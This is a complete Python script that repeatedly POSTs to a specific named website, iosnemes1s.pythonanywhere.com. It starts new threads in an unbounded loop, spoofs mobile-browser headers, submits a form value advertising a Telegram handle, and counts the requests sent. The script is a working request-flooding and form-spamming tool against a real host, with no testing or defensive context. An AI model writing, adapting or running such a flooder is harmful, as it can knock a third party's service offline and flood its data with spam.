import requests
import threading

# Counter variable for the number of threads sent
thread_count = 0

# Create a lock for thread_count to ensure atomic updates
thread_count_lock = threading.Lock()

def send_request():
    global thread_count

    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.8',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://iosnemes1s.pythonanywhere.com',
        'Referer': 'https://iosnemes1s.pythonanywhere.com/',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Sec-GPC': '1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',
        'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }

    data = {
        'ECIDnumber': 'telegram__@ARDIYOO',
    }

    response = requests.post('https://iosnemes1s.pythonanywhere.com/', headers=headers, data=data)

    # Update the thread count and print the current count without a new line
    with thread_count_lock:
        thread_count += 1
        print(f"\rNumber of threads sent: {thread_count}", end="")

# Create a flag for stopping the program
stop_flag = False

# Start the threads
while not stop_flag:
    thread = threading.Thread(target=send_request)
    thread.start()
    thread.join(timeout=1)  # Set a timeout to check for the stop flag

# Wait for all remaining threads to complete
for thread in threading.enumerate():
    if thread != threading.current_thread():
        thread.join()
